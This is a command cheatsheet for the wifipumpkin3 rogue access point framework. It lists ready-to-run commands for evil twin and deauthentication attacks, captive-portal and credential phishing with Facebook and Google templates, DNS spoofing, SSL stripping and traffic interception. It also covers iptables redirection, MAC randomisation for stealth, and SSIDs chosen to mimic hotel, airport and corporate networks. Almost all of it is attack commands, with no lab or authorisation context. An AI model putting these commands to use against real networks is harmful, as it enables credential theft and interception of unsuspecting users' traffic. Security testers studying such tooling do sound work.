# wifipumpkin3 Cheatsheet

## Quick Start

```bash
# Basic rogue AP
wifipumpkin3 -i wlan0

# With internet sharing
wifipumpkin3 -i wlan0 -iNet eth0

# Custom SSID
wifipumpkin3 -i wlan0 -m "ssid=FreeWiFi;channel=6"
```

## Essential Commands

```bash
# Start rogue AP
wifipumpkin3 -i wlan0 -iNet eth0

# With custom settings
wifipumpkin3 -i wlan0 -m "ssid=FreeWiFi;channel=6;hidden=false"

# Scripted session
wifipumpkin3 -i wlan0 -p session.pulp

# One-line commands
wifipumpkin3 -i wlan0 -x "set ssid FreeWiFi; set channel 6; start"
```

## RESTful API

```bash
# Start API mode
wifipumpkin3 --rest --restport 1337 --username admin --password secret

# API endpoints
curl -X POST http://localhost:1337/api/attack/start -d '{"type":"captive_portal"}'
curl -X GET http://localhost:1337/api/status
curl -X POST http://localhost:1337/api/attack/stop
```

## Attack Scenarios

### Captive Portal Attack

```bash
# Start wifipumpkin3
wifipumpkin3 -i wlan0 -iNet eth0

# In menu:
# 1. Select "Captive Portal"
# 2. Choose template
# 3. Configure redirect URL
# 4. Start attack
```

### Evil Twin Attack

```bash
# Create rogue AP
wifipumpkin3 -i wlan0 -m "ssid=TargetNetwork;channel=6"

# In menu:
# 1. Select "Deauth" attack
# 2. Target legitimate AP clients
# 3. Start deauthentication
```

### Phishing Attack

```bash
# Start with phishing template
wifipumpkin3 -i wlan0 -iNet eth0

# In menu:
# 1. Select "Phishing"
# 2. Choose template (Facebook, Google, etc.)
# 3. Configure capture settings
# 4. Start attack
```

### Traffic Interception

```bash
# Start with transparent proxy
wifipumpkin3 -i wlan0 -iNet eth0

# In menu:
# 1. Select "Proxy"
# 2. Choose mitmproxy or custom proxy
# 3. Configure interception rules
# 4. Start attack
```

### DNS Spoofing

```bash
# Start with DNS spoofing
wifipumpkin3 -i wlan0 -iNet eth0

# In menu:
# 1. Select "DNS"
# 2. Configure DNS rules
# 3. Redirect targets to attacker IP
# 4. Start attack
```

## Sub-Tools

### captiveflask

```bash
# Basic captive portal
captiveflask -t template.html -s static/ -r 192.168.1.1 -p 8080

# With redirect URL
captiveflask -t template.html -s static/ -r 192.168.1.1 -rU http://example.com

# Force login successful template
captiveflask -t template.html -s static/ -r 192.168.1.1 -f login_success.html
```

### phishkin3

```bash
# External phishing page
phishkin3 -r 192.168.1.1 -p 8080 -cU http://phishing-page.com

# With redirect
phishkin3 -r 192.168.1.1 -p 8080 -cU http://phishing.com -rU http://legitimate.com
```

### evilqr3

```bash
# QR code phishing
evilqr3 -t template.html -s static/ -p 8080 -sa 192.168.1.1 -mu "Mozilla" -tp api_token

# Debug mode
evilqr3 -t template.html -s static/ -p 8080 -sa 192.168.1.1 -d true
```

### sslstrip3

```bash
# Basic SSL stripping
sslstrip3 -l 10000

# With logging
sslstrip3 -l 10000 -w sslstrip.log

# POST only
sslstrip3 -l 10000 -p
```

## Network Setup

### Enable IP Forwarding

```bash
# Enable
sudo sysctl -w net.ipv4.ip_forward=1

# Disable
sudo sysctl -w net.ipv4.ip_forward=0
```

### iptables Rules

```bash
# NAT for internet sharing
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Redirect to captive portal
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# Remove rules
sudo iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE
```

### dnsmasq Configuration

```bash
# Basic dnsmasq config
cat > /tmp/dnsmasq.conf << 'EOF'
interface=wlan0
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
EOF

# Start dnsmasq
sudo dnsmasq -C /tmp/dnsmasq.conf
```

## Stealth Configuration

```bash
# Random MAC address
macchanger -r wlan0

# Hidden SSID
wifipumpkin3 -i wlan0 -m "ssid=FreeWiFi;hidden=true"

# Custom channel
wifipumpkin3 -i wlan0 -m "ssid=FreeWiFi;channel=11"

# Disable colors for scripting
wifipumpkin3 -i wlan0 --no-colors
```

## Integration

### With Aircrack-ng

```bash
# Monitor mode
sudo airmon-ng start wlan0

# Capture handshakes
airodump-ng wlan0mon

# Deauthenticate clients
aireplay-ng --deauth 10 -a [AP_MAC] wlan0mon
```

### With Metasploit

```bash
# 1. Start rogue AP
wifipumpkin3 -i wlan0

# 2. Capture credentials
# 3. Use Metasploit for exploitation
```

## Debugging

```bash
# Check wireless adapter mode
iw list | grep -A 10 "Supported interface modes"

# Kill interfering processes
sudo airmon-ng check kill

# Check hostapd status
sudo systemctl status hostapd

# Check dnsmasq status
sudo systemctl status dnsmasq

# Debug output
wifipumpkin3 -i wlan0 --no-colors 2>&1 | tee wp3_debug.log
```

## Common Patterns

```bash
# Hotel/airport WiFi mimic
wifipumpkin3 -i wlan0 -m "ssid=Hotel_Guest_WiFi;channel=6"

# Corporate WiFi
wifipumpkin3 -i wlan0 -m "ssid=CorpWiFi;channel=1"

# Public hotspot
wifipumpkin3 -i wlan0 -m "ssid=Free_Public_WiFi;channel=11"
```

## Cleanup

```bash
# Remove iptables rules
sudo iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -t nat -D PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-port 8080

# Disable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=0

# Kill processes
sudo killall hostapd
sudo killall dnsmasq

# Reset interface
sudo ip link set wlan0 down
sudo iw dev wlan0 set type managed
sudo ip link set wlan0 up
```
